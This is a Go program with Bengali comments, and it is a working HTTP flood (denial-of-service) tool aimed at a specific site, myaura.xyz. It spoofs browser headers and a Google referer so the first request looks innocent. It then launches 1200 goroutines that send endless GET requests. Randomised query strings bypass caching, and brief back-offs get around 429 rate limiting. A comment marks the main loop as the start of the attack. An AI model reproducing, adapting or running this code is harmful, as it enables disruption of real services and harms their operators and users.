package main

import (
	"fmt"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"time"
)

func main() {
	target := "https://myaura.xyz/"
	threads := 1200 // একবারে খুব বেশি দিও না, ৪২৯ কমাতে এটা ঠিক আছে

	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar:     jar,
		Timeout: 15 * time.Second,
	}

	fmt.Println("🕵️ Phase 1: Stealth Warm-up (Obtaining Session)...")

	// ১. একটু দেরি করে প্রথম রিকোয়েস্ট পাঠানো যাতে সন্দেহ না হয়
	time.Sleep(2 * time.Second)
	
	req, _ := http.NewRequest("GET", target, nil)
	// হেডারগুলো আরও শক্তিশালী করা হয়েছে
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Referer", "https://www.google.com/")

	resp, err := client.Do(req)
	if err != nil || resp.StatusCode == 429 {
		fmt.Printf("⚠️ Warm-up Warning (Status: %d). Retrying in 5 seconds...\n", resp.StatusCode)
		time.Sleep(5 * time.Second)
	} else {
		fmt.Printf("✅ Session Secured! (Status: %d)\n", resp.StatusCode)
	}
	if resp != nil { resp.Body.Close() }

	fmt.Println("🚀 Phase 2: Launching Adaptive Vortex Engine...")

	// ২. অ্যাটাক শুরু
	for i := 0; i < threads; i++ {
		go func(id int) {
			for {
				// রেন্ডম স্ট্রিং যাতে সার্ভার ক্যাশ না করতে পারে
				url := fmt.Sprintf("%s?v=%d&s=%d", target, rand.Intn(1000000), id)
				
				res, err := client.Get(url)
				if err == nil {
					if id == 0 {
						fmt.Printf("📡 Status: %d | Cookies: Active\n", res.StatusCode)
					}
					
					// যদি ৪২৯ আসে, তবে ওই থ্রেডটা একটু জিরিয়ে নিবে (Adaptive Back-off)
					if res.StatusCode == 429 {
						time.Sleep(time.Duration(rand.Intn(1000)+500) * time.Millisecond)
					}
					res.Body.Close()
				} else {
					time.Sleep(200 * time.Millisecond)
				}
			}
		}(i)
	}
	select {}
}
